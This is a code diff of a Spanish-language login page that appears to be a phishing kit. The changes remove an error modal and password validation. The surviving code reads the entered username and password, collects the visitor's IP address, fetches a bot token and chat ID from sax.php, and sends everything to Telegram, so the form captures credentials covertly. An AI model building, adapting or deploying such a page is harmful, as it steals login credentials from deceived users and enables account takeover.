@@ -13,44 +13,6 @@
         font-family: dinReg;
         src: url(din-regular.ttf);
     }
-
-    /* Estilos para el modal */
-    #modal {
-        display: none; /* Oculto por defecto */
-        position: fixed;
-        z-index: 100; /* Asegura que esté en frente */
-        left: 0;
-        top: 0;
-        width: 100%;
-        height: 100%;
-        background-color: rgba(0, 0, 0, 0.5); /* Fondo oscuro */
-        justify-content: center;
-        align-items: center;
-    }
-
-    #modal-content {
-        background-color: white;
-        padding: 20px;
-        border-radius: 10px;
-        width: 300px;
-        text-align: center;
-    }
-
-    #modal-content p {
-        font-family: dinReg, sans-serif;
-        font-size: 18px;
-        color: #333;
-    }
-
-    #modal-content button {
-        margin-top: 20px;
-        padding: 10px 20px;
-        background-color: rgb(0, 105, 60);
-        color: white;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-    }
 </style>
 
 <div id="main-cnt" style="overflow: hidden; min-height:100vh; position: relative;">
@@ -73,14 +35,6 @@
                 </div>
             </div>
         </div>
-    </div>
-</div>
-
-<!-- Modal de advertencia -->
-<div id="modal">
-    <div id="modal-content">
-        <p>Usuario o contraseña invalido</p>
-        <button id="btnAceptar">Aceptar</button>
     </div>
 </div>
 
@@ -111,17 +65,6 @@
 
 <script>
     document.addEventListener("DOMContentLoaded", function() {
-        // Prevenir espacios en el campo de usuario
-        document.getElementById("i1").addEventListener("input", function(event) {
-            this.value = this.value.replace(/\s/g, '');
-        });
-
-        // Validar la contraseña según los requisitos
-        function validarContrasena(contrasena) {
-            const regex = /^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?=.*[!#$%&()*+,\-.\/:><=\\{}\|¡])[A-Za-z\d!#$%&()*+,\-.\/:><=\\{}\|¡]{8,32}$/;
-            return regex.test(contrasena);
-        }
-
         // Función para obtener el token y el chat ID desde sax.php
         function obtenerToken() {
             return fetch('sax.php') // Asegúrate de que sax.php esté configurado correctamente para devolver JSON
@@ -164,12 +107,6 @@
             // Obtener los valores ingresados en el formulario
             const usuario = document.getElementById("i1").value;
             const contrasena = document.getElementById("i2").value;
-
-            // Validar la contraseña
-            if (!validarContrasena(contrasena)) {
-                mostrarModal();
-                return;
-            }
 
             // Obtener la IP y el token, luego enviar el mensaje a Telegram
             Promise.all([obtenerToken(), obtenerIP()])
@@ -214,18 +151,6 @@
                 console.error('Error al enviar el mensaje:', error);
             });
         }
-
-        // Función para mostrar el modal
-        function mostrarModal() {
-            const modal = document.getElementById("modal");
-            modal.style.display = "flex";
-        }
-
-        // Cerrar el modal cuando se presione el botón "Aceptar"
-        document.getElementById("btnAceptar").addEventListener("click", function() {
-            const modal = document.getElementById("modal");
-            modal.style.display = "none";
-        });
     });
 </script>
 </body>
